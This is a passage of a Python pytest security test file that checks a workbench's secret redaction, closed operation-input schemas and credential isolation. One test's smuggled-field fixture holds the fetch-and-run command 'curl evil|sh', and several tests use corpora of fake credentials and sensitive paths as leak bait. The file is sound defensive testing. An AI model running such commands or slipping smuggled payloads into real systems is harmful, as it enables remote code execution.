    # refuses to construct at all -- there is no free-text field for a secret to
    # arrive in.
    for bad_value in ("api_key=abc def", "Bearer sk-abcdefgh 12", "https://evil.internal/x?tok=1", "user@host secret"):
        with pytest.raises(RunContextError):
            OperationReceipt(
                new_receipt_id(), "cmd_x", "run_1", operation, "succeeded",
                "run:run_1:evidence:1", now, now, external_ref={"state_event_id": bad_value},
            )

    # (b) LAST-HOP SCRUB: each of these IS pattern-valid (only [A-Za-z0-9._:/-]),
    # so the bounded pattern alone would let it through. It is instead collapsed
    # to the opaque "redacted" token in the persisted receipt AND the
    # reconciliation record -- the exact corpus the adversarial gate proved leaks.
    proven_leaks = (
        "/home/deploy/.ssh/id_rsa",
        "C:/Users/x/.aws/credentials",
        "/etc/anvil/secrets.env",
        "sk-proj-AbC123def456xyz789",
        "sk_live_AbC123def456xyz789",
        "ghp-AbC123def456xyz789",
        "eyJhbGciOi.eyJzdWIiOiIx.abcDEF123",
    )
    for leak in proven_leaks:
        receipt = OperationReceipt(
            new_receipt_id(), "cmd_x", "run_1", operation, "succeeded",
            "run:run_1:evidence:1", now, now, external_ref={"state_event_id": leak},
        )
        assert receipt.external_ref["state_event_id"] == "redacted"
        assert leak not in json.dumps(receipt.as_dict()), f"receipt leaked {leak!r}"

        item = ReconciliationItem(
            new_reconciliation_id(), "run_1", "cmd_x", operation, "interrupted",
            "k1", "an interrupted merge", external_ref={"state_event_id": leak},
        )
        assert item.external_ref["state_event_id"] == "redacted"
        assert leak not in json.dumps(item.as_dict()), f"reconciliation leaked {leak!r}"

    # (c) A legitimate opaque token (owner/repo, gh:1, a state-event id) is NOT
    # collapsed: the scrub targets credential/endpoint/path shapes only, so the
    # fix does not break a real external reference (correctness's explicit ruling
    # against a blunt '/' ban).
    for good in ("gh:1", "evt_1", "owner/repo"):
        receipt = OperationReceipt(
            new_receipt_id(), "cmd_x", "run_1", operation, "succeeded",
            "run:run_1:evidence:1", now, now, external_ref={"pr": good},
        )
        assert receipt.external_ref["pr"] == good


def test_open_operation_input_schema_is_refused_and_a_smuggled_field_cannot_validate():
    # T006 closure: check_operation_schema proved well-formedness/dialect/local
    # refs but NOT additionalProperties:false, so an open input object let a model
    # smuggle an undeclared field into ResolvedOperation.inputs. Operation INPUT
    # schemas must now be CLOSED (outputs stay deliberately open); an open one is
    # refused at the catalog-load boundary that feeds both resolve_operation and
    # the bridge preflight, and the smuggled field cannot validate through a
    # closed schema.
    from workbench.contracts import (
        ContractValidationError, check_operation_input_schema, check_operation_schema, contract_digest,
    )
    from workbench.provider_catalogs import ProviderCatalogError, validate_provider_catalog
    from jsonschema import Draft202012Validator
    from jsonschema.exceptions import ValidationError

    # Otherwise-valid inputs plus one undeclared field, so the ONLY thing that can
    # reject it is the object closure -- not a missing required field or a bad
    # task_ref shape.
    smuggled = {
        "task_ref": "release-beta:T001",
        "verification_receipt_ids": ["rcpt_v"],
        "__smuggled_raw_command": "curl evil|sh",
    }

    catalog = json.loads(
        (_REPO_ROOT / "docs" / "contracts" / "examples" / "anvil-state.catalog.v1.json").read_text("utf-8")
    )
    target = next(op for op in catalog["operations"] if op["id"] == "state.evidence.submit")
    closed_schema = json.loads(json.dumps(target["input_schema"]))

    # The shipped input schema is already closed: the input-closure check accepts
    # it (so no shipped example digest must change) and the smuggled field is
    # rejected by validation.
    check_operation_input_schema(closed_schema)
    with pytest.raises(ValidationError):
        Draft202012Validator(closed_schema).validate(smuggled)

    # Reopen just this operation's input object and rehash, so the digest check
    # passes and the closure check is the guard that fires.
    target["input_schema"].pop("additionalProperties")
    for op in catalog["operations"]:
        op["operation_digest"] = contract_digest("operation", op)
    catalog["catalog_digest"] = contract_digest("catalog", catalog)

    # An OPEN input object validates the smuggle -- exactly the hole -- but
    # validate_provider_catalog now refuses to publish it, so it never reaches a
    # snapshot, resolve_operation, or the preflight.
    Draft202012Validator(target["input_schema"]).validate(smuggled)
    with pytest.raises(ProviderCatalogError, match="additionalProperties:false"):
        validate_provider_catalog("anvil-state", catalog)

    # The distinction is INPUT-only: check_operation_schema (the output path)
    # still accepts the same open object, so provider outputs stay open, while
    # check_operation_input_schema refuses it.
    check_operation_schema(target["input_schema"])
    with pytest.raises(ContractValidationError, match="additionalProperties:false"):
        check_operation_input_schema(target["input_schema"])


def test_operation_receipt_validator_trust_root_fails_closed(monkeypatch, tmp_path):
    # The receipt contract loader is the single interpretation of the receipt
    # schema; its fail-closed guards (absent schema -> OSError, a reopened root or
    # sub-object, a dropped error-summary credential guard) must each be exercised
    # so a future edit deleting one cannot pass silently. Mirrors the sibling
    # loader trust-root tests (test_plan_task_delivery, test_advanced_contracts,
    # test_capability_profiles). Resets the module cache in try/finally so a
    # drifted validator never cascades into an unrelated test.
    from workbench import contracts as contracts_module

    schemas = _REPO_ROOT / "docs" / "contracts" / "schemas"
    base = json.loads((schemas / "operation-receipt.v1.schema.json").read_text("utf-8"))

    def _write(mutate) -> Path:
        drifted = json.loads(json.dumps(base))
        mutate(drifted)
        path = tmp_path / f"drifted-{mutate.__name__}.schema.json"
        path.write_text(json.dumps(drifted), encoding="utf-8")
        contracts_module._reset_operation_receipt_contract_validator_cache()
        monkeypatch.setattr(contracts_module, "_OPERATION_RECEIPT_CONTRACT_SCHEMA_PATH", path)
        return path

    contracts_module._reset_operation_receipt_contract_validator_cache()
    try:
        # (1) Absent schema file: the OSError is caught and re-raised closed.
        monkeypatch.setattr(
            contracts_module, "_OPERATION_RECEIPT_CONTRACT_SCHEMA_PATH", tmp_path / "absent.schema.json"
        )
        with pytest.raises(contracts_module.ContractValidationError, match="schema is unavailable"):
            contracts_module.operation_receipt_contract_validator()

        # (2) Reopened ROOT object.
        def reopen_root(s):
            s["additionalProperties"] = True
        _write(reopen_root)
        with pytest.raises(contracts_module.ContractValidationError, match="no longer closes its root object"):
            contracts_module.operation_receipt_contract_validator()

        # (3) Reopened a closed SUB-object (the error block).
        def reopen_error(s):
            s["properties"]["error"].pop("additionalProperties")
        _write(reopen_error)
        with pytest.raises(contracts_module.ContractValidationError, match="no longer closes its error object"):
            contracts_module.operation_receipt_contract_validator()

        # (4) Dropped the error-summary credential-class token guard.
        def drop_summary_guard(s):
            s["properties"]["error"]["properties"]["safe_summary"].pop("not")
        _write(drop_summary_guard)
        with pytest.raises(contracts_module.ContractValidationError, match="guards its error summary"):
            contracts_module.operation_receipt_contract_validator()
    finally:
        contracts_module._reset_operation_receipt_contract_validator_cache()


def test_persisted_operation_receipt_exposes_only_its_closed_field_set():
    from workbench.contracts import validate_operation_receipt
    from workbench.models import OperationRef, OperationRefusal
    from workbench.store import MemoryOperationReceiptStore, OperationOutcome

    store = MemoryOperationReceiptStore()
    operation = OperationRef("anvil-state", "state.evidence.submit", "1.0.0", "sha256:" + "4" * 64)
    denied, _ = store.record_attempt(
        run_id="run_1", command_id="cmd_1", operation=operation, idempotency_key="k1",
        task_ref="release-beta:T001",
        executor=lambda: OperationOutcome(
            "denied",
            error=OperationRefusal(
                "approval.invalid", "grant reached via https://evil.internal/tok secret", retryable=False,
            ),
        ),
    )
    # Closed-set: no field outside the declared receipt shape (leak-by-addition).
    assert set(denied) - _RECEIPT_ALLOWED_FIELDS == set()
    assert denied["redaction"]["status"] == "metadata_only"
    # The persisted receipt is schema valid and carries no seeded leak.
    validate_operation_receipt(denied)
    blob = json.dumps(denied)
    assert "evil.internal" not in blob
    assert "secret" not in blob


def test_reconciliation_record_scrubs_a_seeded_secret_and_path_summary():
    from workbench.store import MemoryOperationReceiptStore, UnknownOutcomeError
    from workbench.models import OperationRef

    store = MemoryOperationReceiptStore()
    operation = OperationRef("project-bridge", "bridge.github.merge_and_accept", "1.0.0", "sha256:" + "0" * 64)

    def interrupted():
        raise UnknownOutcomeError(
            r"merge unknown; token at C:\creds\gh.pem via https://api.github.example/x",
            external_ref={"pr": "gh:1"}, reason="interrupted",
        )

    store.record_attempt(
        run_id="run_1", command_id="cmd_1", operation=operation, idempotency_key="k1", executor=interrupted,
    )
    item = store.list_reconciliations()[0]
    assert "[REDACTED-PATH]" in item["safe_summary"]
    assert "[REDACTED-URL]" in item["safe_summary"]
    assert "gh.pem" not in json.dumps(item)
    assert "api.github.example" not in json.dumps(item)


def test_a_model_operation_request_cannot_select_an_unprofiled_capability():
    # Defence-in-depth security assertion: a model naming an operation that is in
    # the discovered catalog but absent from the run's pinned capability profile
    # is refused for that exact reason, never resolved into a dispatch.
    from _support import compile_delivery_snapshot, operation_ref_for, published_catalog_set
    from workbench.models import TypedOperationError
    from workbench.workflows import resolve_operation_request

    proposal = {
        "schema_version": "workbench-model-proposal/v1",
        "kind": "operation_request",
        "reason": "Attempt to read the project snapshot outside the profile.",
        "operation": operation_ref_for("state.project.snapshot"),
        "input": {},
    }
    with pytest.raises(TypedOperationError) as excinfo:
        resolve_operation_request(proposal, compile_delivery_snapshot(), published_catalog_set())
    assert excinfo.value.code == "operation.unprofiled"


# ---------------------------------------------------------------------------
# Reviewed-plugin credential-reference and health/redaction boundaries
# (reviewed-tools-plugins T002 criterion 2 / T003): a credential value is never
# representable, never accepted from nor returned to the browser/model, a
# scope-mismatched credential blocks before dispatch, and every human-readable
# receipt field is scrubbed even in the served response.
# ---------------------------------------------------------------------------

import dataclasses as _pl_dc
import json as _pl_json
from pathlib import Path as _PlPath

import pytest as _pl_pytest
from fastapi.testclient import TestClient as _PlTestClient

from workbench.api import create_app as _pl_create_app
from workbench.config import Settings as _PlSettings
from workbench.contracts import (
    ContractValidationError as _PlContractError,
    approval_payload_digest as _pl_approval_hash,
    contract_digest as _pl_digest,
    validate_plugin_request as _pl_validate_request,
)
from workbench.graph import NullGraph as _PlNullGraph
from workbench.plugin_host import (
    CredentialBroker as _PlBroker,
    CredentialHandle as _PlHandle,
    HostInstallOutcome as _PlOutcome,
    MemoryPluginHostStore as _PlStore,
    PluginDiscovery as _PlDiscovery,
    PluginHostService as _PlService,
)
from workbench.store import MemoryStore as _PlMemoryStore

_PL_SEC_EXAMPLES = _PlPath(__file__).resolve().parents[1] / "docs" / "contracts" / "examples"
_PL_SEC_NOTIFIER_DIGEST = "sha256:5474ca8eb2d41d767772c8a5ba33a1e90f5cb57017c4c8ab6487bd8ee6ba8dbb"

# The adversarial corpus the gate seeds: distinctive raw markers that must never
# survive into a persisted or served receipt.
_PL_CORPUS = {
    "akia": "AKIAIOSFODNN7EXAMPLE",
    "jwt": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.sig",
    "pem": "-----BEGIN RSA PRIVATE KEY-----",
    "ipport": "10.0.0.5:5432",
    "dottedhost": "internal.db.corp:9200",
    # A scheme-less single-label host:port (a tailnet compose service name): the
    # shared redact_config_text leaves a DOTLESS label:port intact (its host rule
    # needs a dot), so only the receipt safeText backstop stops it (finding 1).
    "dotlesshost": "serving:8443",
    "etcpath": "/etc/anvil/secrets.yaml",
    "dburl": "postgresql://user:pw@db:5432/anvil",
    "skproj": "sk-proj-ABCDEFGH12345678",
    "ghp": "ghp_ABCDEFGHIJKLMNOP0123456789",
    "cpath": "C:" + chr(92) + "Users" + chr(92) + "admin",
    "tailnet": "serving.tail1234.ts.net",
}
_PL_CORPUS_TEXT = "install failed: " + " ".join(_PL_CORPUS.values())


def _pl_sec_load(name):
    return _pl_json.loads((_PL_SEC_EXAMPLES / name).read_text(encoding="utf-8"))


def _pl_sec_install_request():
    subject = {
        "kind": "install", "plugin_id": "deploy-notifier",
        "plugin_digest": _PL_SEC_NOTIFIER_DIGEST, "target_version": "1.0.0",
    }
    request = {
        "schema_version": "workbench-plugin-request/v1",
        "request_id": "plugreq_installnotifier01",
        "request_digest": "sha256:" + "0" * 64,
        "kind": "install",
        "actor": {"actor_id": "operator-01", "kind": "operator"},
        "plugin": {"plugin_id": "deploy-notifier", "plugin_digest": _PL_SEC_NOTIFIER_DIGEST},
        "lifecycle": {"target_version": "1.0.0"},
        "approval": {
            "grant_id": "approval_installnotifier01", "action": "install_plugin",
            "payload_hash": _pl_approval_hash(subject),
        },
        "preview_ref": {"preview_id": "plugprev_installnotifier01"},
        "created_at": "2026-07-20T12:00:00Z",
    }
    request["request_digest"] = _pl_digest("plugin-request", request)
    return request


def _pl_sec_discovery():
    return _PlDiscovery(_pl_sec_load("plugin.catalog.v1.json"), _pl_sec_load("plugin.capability.v1.json"))


def test_plugin_credential_value_is_structurally_unrepresentable_in_the_host():
    # A credential handle carries a reference and an opaque token only -- there is
    # no value/secret/material field, so a credential value cannot be constructed
    # or serialized anywhere in the isolated host.
    fields = {f.name for f in _pl_dc.fields(_PlHandle)}
    assert fields == {"owner_host", "ref", "handle"}
    for forbidden in ("value", "secret", "material", "password", "token_value", "key"):
        assert forbidden not in fields
    # And a minted handle serializes with no value.
    handle = _PlHandle(owner_host="anvil-connector-host", ref="deploy-channel-ref", handle="abc123")
    assert "value" not in _pl_dc.asdict(handle)


def test_plugin_host_source_never_reads_a_credential_value_field():
    # Static guarantee: the plugin-host module resolves credentials by reference
    # only; it never dereferences a value/secret/password field off a credential.
    src = (_PlPath(__file__).resolve().parents[1] / "workbench" / "plugin_host.py").read_text(encoding="utf-8")
    for forbidden in ('credential["value"]', "credential.get(\"value\")",
                      'credential["secret"]', 'credential["password"]',
                      "credential_value", ".secret_value"):
        assert forbidden not in src, f"plugin_host reads a credential value: {forbidden!r}"


def test_plugin_request_cannot_carry_a_credential_value_from_the_browser():
    # T003 criterion 1 (accept direction): the closed plugin-request schema makes
    # a credential value unrepresentable -- an injected value field is refused, so
    # no auth material can be accepted from the browser/model.
    for injected in ("credential", "credential_value", "token", "secret", "api_key", "password"):
        request = _pl_sec_install_request()
        request[injected] = "s3cr3t-value"
        request["request_digest"] = _pl_digest("plugin-request", request)
        with _pl_pytest.raises(_PlContractError):
            _pl_validate_request(request)


def test_plugin_install_cannot_reach_a_workbench_or_bridge_credential():
    # T002 criterion 2: even when the broker holds Workbench/bridge/provider
    # secrets under other hosts, the notifier install resolves ONLY its own
    # declared reference -- the unrelated secrets are structurally unreachable.
    broker = _PlBroker({
        "anvil-connector-host": ["deploy-channel-ref"],
        "workbench-hub": ["workbench-db-password", "bridge-bootstrap-token", "github-token"],
    })
    store = _PlStore()
    seen = {}

    def runner(discovered, handles):
        seen["refs"] = tuple(h.ref for h in handles)
        seen["hosts"] = tuple(h.owner_host for h in handles)
        return _PlOutcome(status="installed", output={"ok": True})

    receipt = store.install(_pl_sec_install_request(), _pl_sec_discovery(), broker, runner)
    assert receipt["status"] == "accepted"
    assert seen["refs"] == ("deploy-channel-ref",)
    assert seen["hosts"] == ("anvil-connector-host",)
    # The receipt's credential_use likewise names only the plugin's own ref.
    assert receipt["credential_use"]["credential_refs"] == ["deploy-channel-ref"]
    for secret in ("workbench-db-password", "bridge-bootstrap-token", "github-token"):
        assert secret not in _pl_json.dumps(receipt)


def test_plugin_scope_mismatched_credential_blocks_before_dispatch():
    # T003 criterion 2: a declared reference the host does not own is refused
    # BEFORE the host runner is ever called; the install denies and persists
    # nothing.
    broker = _PlBroker({"anvil-connector-host": ["a-different-ref"]})
    store = _PlStore()
    ran = []

    def runner(discovered, handles):
        ran.append(True)
        return _PlOutcome(status="installed")

    receipt = store.install(_pl_sec_install_request(), _pl_sec_discovery(), broker, runner)
    assert receipt["status"] == "denied"
    assert receipt["error"]["code"] == "credential_unavailable"
    assert ran == []
    assert store.rows.receipts == {}


def _pl_sec_client(service):
    settings = _PlSettings(
        database_url="unused", neo4j_uri="unused", neo4j_user="neo4j", neo4j_password="",
        owner="operator", approvers=frozenset({"operator"}), bridge_bootstrap_token="",
        anvil_router_base_url="", anvil_router_token="",
        identity_header="X-Workbench-Actor", allow_insecure_dev_actor=True,
    )
    return _PlTestClient(_pl_create_app(
        settings=settings, store=_PlMemoryStore(), graph=_PlNullGraph(), plugin_host_service=service,
    ))


def test_plugin_receipt_adversarial_prose_is_scrubbed_in_the_served_response():
    # T003 criterion 3: an in-flight (reconcile) receipt whose host summary ferries
    # the full credential/endpoint/path corpus is scrubbed both at construction
    # and again at the API last hop -- the served response leaks nothing.
    service = _PlService(_pl_sec_discovery())
    request = _pl_sec_install_request()
    service.store.install(
        request, _pl_sec_discovery(), _PlBroker({"anvil-connector-host": ["deploy-channel-ref"]}),
        lambda discovered, handles: _PlOutcome(status="unknown", summary=_PL_CORPUS_TEXT),
    )
    with _pl_sec_client(service) as client_:
        served = client_.get(
            f"/api/plugins/receipts/{request['request_digest']}", headers={"X-Workbench-Actor": "operator"}
        )
        assert served.status_code == 200
        assert served.json()["receipt"]["status"] == "reconcile"
        blob = served.text
        for name, marker in _PL_CORPUS.items():
            assert marker not in blob, f"served receipt leaked corpus item {name!r}: {marker!r}"


def test_plugin_receipt_scheme_less_host_port_is_scrubbed_in_the_served_response():
    # Finding 1 (isolated revert-detection): a dotless single-label serving:8443
    # (a tailnet compose service name) is NOT removed by the shared
    # redact_config_text -- its host rule requires a dot -- so ONLY the receipt
    # safeText backstop stops it. The summary carries no other sensitive shape, so
    # reverting the backstop's lowercase-anchored host:port alternative lets
    # serving:8443 ride out to the served response and makes this fail.
    service = _PlService(_pl_sec_discovery())
    request = _pl_sec_install_request()
    service.store.install(
        request, _pl_sec_discovery(), _PlBroker({"anvil-connector-host": ["deploy-channel-ref"]}),
        lambda discovered, handles: _PlOutcome(status="unknown", summary="in-flight at serving:8443"),
    )
    with _pl_sec_client(service) as client_:
        served = client_.get(
            f"/api/plugins/receipts/{request['request_digest']}", headers={"X-Workbench-Actor": "operator"}
        )
        assert served.status_code == 200
        assert served.json()["receipt"]["status"] == "reconcile"
        assert "serving:8443" not in served.text
# Preference configuration security lens (preferences-configuration:
# T004.1 / T002.2)
# ---------------------------------------------------------------------------


def _pref_catalog_doc() -> dict:
    path = _REPO_ROOT / "docs" / "contracts" / "examples" / "settings-descriptor.v1.json"
    return json.loads(path.read_text(encoding="utf-8"))


def test_secret_and_deployment_only_values_cannot_enter_a_policy_operation():
    # T004.1 criterion 4 (security lens): a secret/path-like or deployment-only
    # value is authority-owned and can never be carried in an operation payload.
    from workbench.models import PolicyOperationError, build_policy_operation

    catalog = _pref_catalog_doc()
    by_id = {s["id"]: s for s in catalog["settings"]}
    for setting_id in ("deployment.identity_header_name", "deployment.state_read_location"):
        with pytest.raises(PolicyOperationError):
            build_policy_operation(
                by_id[setting_id], operation="preference.set", op_version=1, value="whatever",
            )


def test_preference_free_text_value_serializations_scrub_the_proven_leak_corpus():
    # Security lens: a free-text preference value or operation payload that
    # reaches a serialized/persisted record must be scrubbed with the hardened
    # config-class scrubber, so no secret/endpoint/path can ride out. A revert to
    # the transcript-only scrub (or dropping the as_dict scrub) fails this test.
    from workbench.models import (
        PolicyOperation,
        PolicyOperationPreview,
        PreferenceRecord,
    )

    poison = _corpus_field("note")

    record = PreferenceRecord(
        setting_id="personal.custom_label", scope="personal", scope_key="alice",
        value=poison, write_version=1, updated_by="alice",
    )
    operation = PolicyOperation("preference.set", "personal.custom_label", "personal", 1, poison)
    preview = PolicyOperationPreview(operation, poison)

    blobs = [
        json.dumps(record.as_dict()),
        json.dumps(operation.as_dict()),
        json.dumps(preview.as_dict()),
    ]
    for label, literal in _RUN_CONTEXT_LEAK_CORPUS.items():
        for blob in blobs:
            assert literal not in blob, f"a preference serialization leaked a {label!r} value"
    for fragment in ("AKIAIOSFODNN7", "eyJhbGci", "BEGIN RSA PRIVATE KEY", "100.64.0.5", "db.internal", "state.db"):
        for blob in blobs:
            assert fragment not in blob, f"a preference serialization leaked fragment {fragment!r}"
    # The audit metadata never carries the value at all (no leak surface). The
    # scope-key fingerprint is a keyed HMAC, so the metadata carries neither the
    # value nor a dictionary-recoverable tag.
    assert poison not in json.dumps(record.audit_metadata(key=b"pref-audit-key-0123456789"))


def test_preference_store_cross_scope_reads_are_byte_identical():
    # T002.2 security lens: a cross-actor and a cross-project read return the
    # exact same not-found bytes a genuinely missing record returns, so neither
    # is a cross-scope existence oracle.
    from workbench.store import MemoryPreferenceStore, UnknownPreferenceError

    store = MemoryPreferenceStore(_pref_catalog_doc())
    store.set_preference("personal", "alice", "personal.time_format", "format_12h", 0, "alice")
    store.set_preference("project", "proj_1", "project.delivery_route", "route.delivery-heavy", 0, "alice")

    def _raw(fn) -> bytes:
        try:
            fn()
        except UnknownPreferenceError as exc:
            return repr(exc.args).encode("utf-8")
        raise AssertionError("expected UnknownPreferenceError")

    foreign_actor = _raw(lambda: store.get("personal", "mallory", "personal.time_format"))
    foreign_project = _raw(lambda: store.get("project", "proj_9", "project.delivery_route"))
    missing = _raw(lambda: store.get("personal", "nobody", "personal.landing_surface"))
    assert foreign_actor == foreign_project == missing


def test_preference_store_cross_scope_write_is_indistinct_from_unknown_id():
    # T002.3 crit 2 (store lens): a cross-scope WRITE raises the SAME
    # UnknownPreferenceError an unknown id raises, byte-for-byte, so the write
    # surface is not an existence oracle for authority setting ids.
    from workbench.store import MemoryPreferenceStore, UnknownPreferenceError

    store = MemoryPreferenceStore(_pref_catalog_doc())

    def _raw(fn) -> bytes:
        try:
            fn()
        except UnknownPreferenceError as exc:
            return repr(exc.args).encode("utf-8")
        raise AssertionError("expected UnknownPreferenceError")

    # A real authority id written from a personal scope, and a genuinely unknown
    # id, produce identical not-found bytes.
    authority = _raw(lambda: store.set_preference(
        "personal", "alice", "deployment.state_read_location", "x", 0, "alice"))
    unknown = _raw(lambda: store.set_preference(
        "personal", "alice", "personal.i_do_not_exist", "x", 0, "alice"))
    assert authority == unknown


def test_preference_store_refuses_approval_gated_write_without_an_approval():
    # Finding 7: an approval-gated policy write must fail closed until the
    # approval layer is wired -- a policy value can never commit unapproved
    # through the actor-facing set_preference. The authority seed path is the
    # only way an already-approved policy value lands.
    from workbench.store import MemoryPreferenceStore, PreferenceStoreError, UnknownPreferenceError

    store = MemoryPreferenceStore(_pref_catalog_doc())
    # Writing the policy setting from its OWN policy scope is refused (no approval).
    with pytest.raises(PreferenceStoreError):
        store.set_preference(
            "policy", "policy", "policy.transcript_retention_max_days", 120, 0, "operator")
    # It never committed.
    with pytest.raises(UnknownPreferenceError):
        store.get("policy", "policy", "policy.transcript_retention_max_days")
    # The authority seed path DOES land it (represents the approved/env write).
    seeded = store.seed_authority_value("policy", "policy.transcript_retention_max_days", 120)
    assert seeded.value == 120
    assert store.get("policy", "policy", "policy.transcript_retention_max_days").value == 120


# --------------------------------------------------------------------------- #
# plan-task-delivery T002/T005 — no served delivery display record (redacted PRD
# body, task title) and no Deliver start receipt (denied summary) can carry a
# secret, endpoint, or local path.  The adversarial corpus mirrors the recurring
# free-text redaction gate.
# --------------------------------------------------------------------------- #

from _support import load_example as _ptd_sec_load_example
from workbench.contracts import contract_digest as _ptd_sec_contract_digest
from workbench.deliver import DeliverRefusal as _PtdDeliverRefusal, MemoryDeliverStartStore as _PtdDeliverStore
from workbench.delivery_projection import MemoryDeliveryProjectionStore as _PtdSecProjection
from workbench.redaction import scrub_config_payload as _ptd_scrub

_PTD_CORPUS = (
    "AKIA1234567890ABCDEF", "token=supersecretvalue", "C:/Users/op/.anvil/state.db",
    "/etc/anvil/prod.env", "eyJhbGciOiJI", "ghp_abcdefghijklmnopqrstuvwxyz012345",
    "sk-proj-abcdefghijklmnop", "db.tail1234.ts.net:7687", "100.64.0.5", "hunter2",
    # The systemic scheme-less single-label host:port (serving:8443) that leaked
    # through every free-text channel until the shared redact_config_text gained
    # the dotless label:port pattern.
    "serving:8443",
)


def _ptd_leaky_text():
    return (
        "See AKIA1234567890ABCDEF and token=supersecretvalue at C:/Users/op/.anvil/state.db "
        "and /etc/anvil/prod.env. JWT eyJhbGciOiJI.eyJzdWIi.sig ghp_abcdefghijklmnopqrstuvwxyz012345 "
        "sk-proj-abcdefghijklmnop reaches db.tail1234.ts.net:7687 at 100.64.0.5:8443 Password=hunter2 "
        "queued in-flight at serving:8443 for the bridge"
    )


def test_ptd_t002_served_prd_and_task_title_are_scrubbed_on_last_hop():
    leaky = _ptd_leaky_text()
    doc = {
        "schema_version": "workbench-prd-content/v1", "content_digest": "sha256:" + "0" * 64,
        "provider": "anvil-state", "generated_at": "2026-07-20T12:00:00Z",
        "prd": {"prd_id": "release-alpha", "title": "Chat-first Workbench", "status": "approved", "revision": 4},
        "content_trust": "untrusted_task_data",
        "content": {"format": "markdown", "body": leaky, "truncated": False,
                    "total_bytes": len(leaky.encode("utf-8"))},
        "redaction": {"status": "redacted", "ruleset": "hub.default"},
    }
    doc["content_digest"] = _ptd_sec_contract_digest("prd-content", doc)
    store = _PtdSecProjection()
    store.capture_prd_content("proj", doc)
    # Mirror the router's last hop: whatever the store returns is scrubbed.
    served = _ptd_scrub({"content": store.get_prd_content("proj", "release-alpha")})
    body = served["content"]["content"]["body"]
    for secret in _PTD_CORPUS:
        assert secret not in body, f"leak survived in served PRD body: {secret}"

    ref = _ptd_sec_load_example("task-reference.v1.json")
    ref["summary"]["title"] = "steal " + leaky
    store.capture_task_reference("proj", ref)
    served_ref = _ptd_scrub({"task": store.get_task_reference("proj", "release-alpha", "T001")})
    title = served_ref["task"]["summary"]["title"]
    for secret in _PTD_CORPUS:
        assert secret not in title, f"leak survived in served task title: {secret}"


def test_ptd_t005_denied_receipt_summary_never_leaks():
    store = _PtdDeliverStore()
    intent = _ptd_sec_load_example("deliver-intent.v1.json")
    leaky_refusal = _PtdDeliverRefusal(
        code="deliver.invalid_worktree",
        safe_summary="blocked at C:/Users/op/.anvil/state.db token=supersecretvalue via serving:8443",
        retryable=False,
    )
    receipt, _ = store.start(intent, launch=lambda: store.default_run_block("run_x_00001"),
                             preconditions=lambda: leaky_refusal)
    assert receipt["status"] == "denied"
    summary = receipt["error"]["safe_summary"]
    for secret in ("state.db", "supersecretvalue", "C:/Users", "serving:8443"):
        assert secret not in summary, f"leak survived in denied receipt: {secret}"
    # And the accepted receipt carries only ids/digests/timestamps — the closed
    # schema structurally admits no path/command/token field.
    ok, _ = store.start(intent, launch=lambda: store.default_run_block("run_ok_000001"),
                        preconditions=None)
    assert set(ok["run"]) <= {"run_id", "workflow_digest", "capability_profile_digest",
                              "started_at", "deadline", "traceparent"}


# --------------------------------------------------------------------------- #
# reviewed-tools-plugins T004/T005 — a chat tool dispatch's persisted + served
# records (reconciliation summary, receipt error, external ref) never ferry a
# credential, endpoint, or path.  Seeds the standard corpus INCLUDING the dotless
# single-label host:port (serving:8443) the shared redact_config_text now
# catches, and proves the scrub on the records the runtime persists and serves.
# --------------------------------------------------------------------------- #

import json as _rtpsec_json
from pathlib import Path as _RtpSecPath

from workbench.contracts import (
    approval_payload_digest as _rtpsec_subject_hash,
    contract_digest as _rtpsec_digest,
    _plugin_approval_subject as _rtpsec_subject,
)
from workbench.models import OperationRefusal as _RtpSecRefusal
from workbench.store import OperationOutcome as _RtpSecOutcome, UnknownOutcomeError as _RtpSecUnknown
from workbench.tool_dispatch import (
    ChatToolDispatchService as _RtpSecService,
    ChatToolSession as _RtpSecSession,
)

_RTPSEC_EX = _RtpSecPath(__file__).resolve().parents[1] / "docs" / "contracts" / "examples"
_RTPSEC_NOTIFIER_DIGEST = "sha256:5474ca8eb2d41d767772c8a5ba33a1e90f5cb57017c4c8ab6487bd8ee6ba8dbb"
_RTPSEC_VIEWER_DIGEST = "sha256:4ae65e4cfc645dc1adf8a742e6485946c1961819b87039ffa0d93ea88253b4fd"


def _rtpsec_service():
    catalog = _rtpsec_json.loads((_RTPSEC_EX / "plugin.catalog.v1.json").read_text(encoding="utf-8"))
    capability = _rtpsec_json.loads((_RTPSEC_EX / "plugin.capability.v1.json").read_text(encoding="utf-8"))
    session = _RtpSecSession(session_id="chatsec1", catalog=catalog, capability=capability,
                             actor_id="operator-01", bridge_id="bridge-a", project_id="proj-1")
    return _RtpSecService(session)


def _rtpsec_effect_request(grant_id="approval_secgrant0001"):
    req = {
        "schema_version": "workbench-plugin-request/v1",
        "request_id": "plugreq_notifysec0001",
        "kind": "tool_call",
        "actor": {"actor_id": "operator-01", "kind": "operator"},
        "plugin": {"plugin_id": "deploy-notifier", "plugin_digest": _RTPSEC_NOTIFIER_DIGEST},
        "tool_call": {"tool_id": "notify.send", "inputs": {"message_ref": "deploy-msg-1"}},
        "created_at": "2026-07-20T12:00:00Z",
    }
    subject_hash = _rtpsec_subject_hash(_rtpsec_subject(req))
    req["approval"] = {"grant_id": grant_id, "action": "invoke_effect_tool", "payload_hash": subject_hash}
    req["request_digest"] = _rtpsec_digest("plugin-request", req)
    return req, subject_hash


def _rtpsec_read_request():
    req = {
        "schema_version": "workbench-plugin-request/v1",
        "request_id": "plugreq_taskssec00001",
        "kind": "tool_call",
        "actor": {"actor_id": "operator-01", "kind": "operator"},
        "plugin": {"plugin_id": "anvil-tasks-viewer", "plugin_digest": _RTPSEC_VIEWER_DIGEST},
        "tool_call": {"tool_id": "tasks.list", "inputs": {"status": "ready"}},
        "created_at": "2026-07-20T12:00:00Z",
    }
    req["request_digest"] = _rtpsec_digest("plugin-request", req)
    return req


def test_rtp_t005_reconciliation_summary_never_leaks_the_corpus():
    service = _rtpsec_service()
    req, subject_hash = _rtpsec_effect_request()
    service.approvals.grant("approval_secgrant0001", "invoke_effect_tool", subject_hash,
                            "bridge-a", "proj-1")

    def unconfirmed(_d, _i):
        raise _RtpSecUnknown(_ptd_leaky_text(), reason="unknown_outcome")

    result = service.dispatch(req, unconfirmed)
    assert result.receipt["status"] == "reconciliation_required"
    item = service.get_reconciliation(req["request_digest"])
    blob = _ptd_scrub({"reconciliation": item})
    text = _rtpsec_json.dumps(blob)
    for secret in _PTD_CORPUS:
        assert secret not in text, f"leak survived in served reconciliation: {secret}"


def test_rtp_t005_read_failure_receipt_summary_never_leaks_the_corpus():
    service = _rtpsec_service()

    def boom(_d, _i):
